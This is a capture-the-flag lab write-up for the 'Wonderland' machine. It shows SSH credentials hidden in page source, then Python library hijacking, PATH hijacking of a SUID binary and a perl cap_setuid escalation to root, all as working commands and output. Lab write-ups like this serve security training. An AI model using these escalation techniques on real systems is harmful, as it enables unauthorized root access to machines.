# Wonderland



with dirsearch found directory:

/r

/r/a

/r/a/b

/r/a/b/b/i/t/

in source code found credentials to ssh connection

<p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>

### First access
```
alice@wonderland:~$ sudo -l
[sudo] password for alice: 
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py


alice can run sudo with user rabbit

script import random library, we can create file name 'random.py' in directory with shell:
	
	import os
	os.system('/bin/bash')

>sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

### Rabbit access
```
rabbit directory found script with Suid permision
this script use command 'date'

rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
--Probably by Tue, 13 Dec 2022 07:20:58 +0000--
Ask very nicely, and I will give you some tea while you wait for him

rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
--Probably by Tue, 13 Dec 2022 07:23:47 +0000--
Ask very nicely, and I will give you some tea while you wait for him

rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
--Probably by Tue, 13 Dec 2022 07:24:08 +0000--
Ask very nicely, and I will give you some tea while you wait for him

we can exploit it, create 'date' file and edit "$PATH"

> nano date
	#!/bin/bash
	/bin/bash

> rabbit@wonderland:/home/rabbit$ export PATH=/home/rabbit:$PATH

> rabbit@wonderland:/home/rabbit$ ./teaParty
```

### Hatter access
```
hatter directory hate password_file

hatter:WhyIsARavenLikeAWritingDesk?

using getcap found 2 binary with cap_suid

hatter@wonderland:/home/hatter$ getcap -r / 2>/dev/null
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep

Hatter can run this binarys 

hatter@wonderland:/home/hatter$ ls -la /usr/bin/perl*
-rwxr-xr-- 2 root hatter 2097720 Nov 19  2018 /usr/bin/perl
-rwxr-xr-- 2 root hatter 2097720 Nov 19  2018 /usr/bin/perl5.26.1

Search PERL in gitfobins

# Compatibilities 
cp $(which perl) .
sudo setcap cap_setuid+ep perl

./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'


> hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

>id
uid=0(root) gid=1003(hatter) groups=1003(hatter)
```
